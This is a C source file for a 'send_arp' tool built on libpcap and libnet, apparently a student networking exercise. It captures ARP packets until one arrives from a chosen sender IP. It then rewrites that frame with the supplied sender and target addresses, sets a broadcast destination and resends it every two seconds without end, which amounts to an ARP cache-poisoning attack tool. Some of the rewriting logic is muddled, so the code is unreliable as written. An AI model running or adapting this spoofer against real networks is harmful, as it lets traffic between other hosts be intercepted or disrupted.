#include <pcap.h>
#include <stdio.h>
#include "libnet.h"
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>


int main(int argc, char *argv[])
{
	pcap_t *handle;			/* Session handle */
	char *dev;			/* The device to sniff on */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[] = "arp";	/* The filter expression */
	bpf_u_int32 mask;		/* Our netmask */
	bpf_u_int32 net;		/* Our IP */
	struct pcap_pkthdr *header;	/* The header that pcap gives us */
	struct libnet_ethernet_hdr* ethr;	/* The header that pcap gives us */
	const u_char *packet;		/* The actual packet */
	struct libnet_ipv4_hdr* ip;
	uint8_t ip_addr[15];
	struct libnet_tcp_hdr* tcp;
	struct ether_arp* arp;
	const uint8_t* sender_ip;
	const uint8_t* target_ip;
	u_char arp_buf[60]={0,0,};
	int count=0;
//	u_char arp_r_buf[60]={0,}
	/* Define the device */

	if(argc!=4) {printf("Usage : send_arp <interface> <sender ip> <target ip>\n");exit(0);}

	if((strlen(argv[2])>15||strlen(argv[2])<7)||(strlen(argv[3])>15||strlen(argv[3])<7)){ printf("Select the correct ip!!\n"); exit(0);}



	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
	
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	/* Compile and apply the filter */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	/* Grab a packet */
	int res;
	//packet = pcap_next(handle, &header);
	
	sender_ip=argv[2];

	target_ip=argv[3];

	while(1)
	{
	int chk=1;
	res = pcap_next_ex(handle, &header, &packet);
	
	if(res<1)
	{

		if(res==-2)
	       	{

			printf("No more packets to read from the savefile.\nSelect the correct files!\n"); break; 
			
			}	

		else if(res==0){printf("Timeout Expired! Retrying to capture packet.....\n");continue;}

		else {printf("Error Occured! Retrying to capture packet.....\n");continue;}
	}

	else

	/* Print its length */
	//printf("Jacked a packet with length of [%d]\n", header->len);
	
	printf("===========================================================================\n");
	
	ethr=(struct libnet_ethernet_hdr*)(packet);
	
	
	printf("eth.dmac %02x:%02x:%02x:%02x:%02x:%02x   \n",ethr->ether_dhost[0],ethr->ether_dhost[1],ethr->ether_dhost[2],ethr->ether_dhost[3],ethr->ether_dhost[4],ethr->ether_dhost[5]);
	


	printf("eth.smac %02x:%02x:%02x:%02x:%02x:%02x   \n",ethr->ether_shost[0],ethr->ether_shost[1],ethr->ether_shost[2],ethr->ether_shost[3],ethr->ether_shost[4],ethr->ether_shost[5]);
	

	(ethr->ether_type)=ntohs(ethr->ether_type);

	printf("ether_type : %x \n",ethr->ether_type);

	printf("===========================================================================\n");
//	if(ethr->ether_type!=ETHERTYPE_IP){printf("It doesn't seem IP Packet\n");continue;}

	if(ethr->ether_type!=ETHERTYPE_ARP){printf("It doesn't seem ARP Packet\n");continue;}

	arp=((struct ether_arp*)&packet[sizeof(struct libnet_ethernet_hdr)]);
			
	inet_ntop(AF_INET,(arp->arp_spa),ip_addr,INET_ADDRSTRLEN);

	printf("ip.src : %s\n",ip_addr);

	chk=strcmp(ip_addr,sender_ip);

	printf("compare%d\n",chk);
	
	inet_ntop(AF_INET,&(arp->arp_tpa),ip_addr,INET_ADDRSTRLEN);

	printf("ip.dst : %s\n",ip_addr);

//	printf("ip_hl test : %x\n",ip->ip_hl);

//	printf("test hlen : %d\n",(ip->ip_hl)*4);
	
	printf("===========================================================================\n");
//	arp->arp_hrd=ntohs(arp->arp_hrd);
	
//	arp->arp_pro=ntohs(arp->arp_pro);

//	arp->arp_op=ntohs(arp->arp_op);


	printf("%x\n\n**%d**",arp->arp_hrd,sizeof(struct ether_arp));
	if(ntohs(arp->arp_op)==ARPOP_REQUEST)
		{
			printf("It is arp request packet%x\n\n%d %x\n",ntohs(arp->arp_op),ethr->ether_dhost[0],ethr->ether_dhost[0]); 
			if(chk==0) 
			{
			printf("Got The Spoof request packet\n");
			break;
			}
		}
	else if(ntohs(arp->arp_op)==ARPOP_REPLY) {printf("It is arp reply packet\n\n"); }

	else {printf("It dosen't seem arp packet\n\n"); continue;}

		
	

	
	
//	tcp=(struct libnet_tcp_hdr*)&packet[14+(ip->ip_hl)*4];
	
	
//	tcp->th_sport=ntohs(tcp->th_sport);

	
//	tcp->th_dport=ntohs(tcp->th_dport);
	
	
//	printf("ip.sport : %d\n",tcp->th_sport);

	
//	printf("ip.dport : %d\n",tcp->th_dport);
	
	
//	ip->ip_len=ntohs(ip->ip_len);
	
	printf("===========================================================================\n");




//	
//	printf("ip_len : %d\n",ip->ip_len);
	
/*	int k=sizeof(struct libnet_ethernet_hdr)+(ip->ip_hl+tcp->th_off)*4;

	printf("DATA\n\n");	

	int size_data=ip->ip_len-(tcp->th_off+ip->ip_hl)*4;
		
	for(int i=0;i<size_data;i++)
		printf("%c",packet[k++]);
	
	printf("\n");

	
	printf("===========================================================================\n");
	
	
	printf("\n\n\n\n\n\n");
*/	


	}

	ethr->ether_dhost[0]=0xff;
	ethr->ether_dhost[1]=0xff;
	ethr->ether_dhost[2]=0xff;
	ethr->ether_dhost[3]=0xff;
	ethr->ether_dhost[4]=0xff;
	ethr->ether_dhost[5]=0xff;

	inet_pton(AF_INET,target_ip,&(arp->arp_tpa));
	
	inet_pton(AF_INET,sender_ip,&(arp->arp_spa));


	//arp->arp_op=htons(arp->arp_op);

	ethr->ether_type=htons(ethr->ether_type);

	*(uint32_t*)(ethr->ether_shost)=*(uint32_t*)(ethr->ether_shost);

	memcpy(arp_buf, packet, 42);

	while(1)
	{
	
	if((pcap_sendpacket(handle, arp_buf,42))==0)
		{
		
		printf("Send!\n");
	
		for(int j=0;j<42;j++)
			{
			printf("%02x ",(arp_buf[j]));
			if((j+1)%16==0&&j!=0)
			printf("\n");
			}
			printf("\n");

//			printf("\n\n%x\n",*(packet+41));

		sleep(2);
		
		}
	else
		exit(0);
	}

	pcap_close(handle);
	
	return 0;
	
}

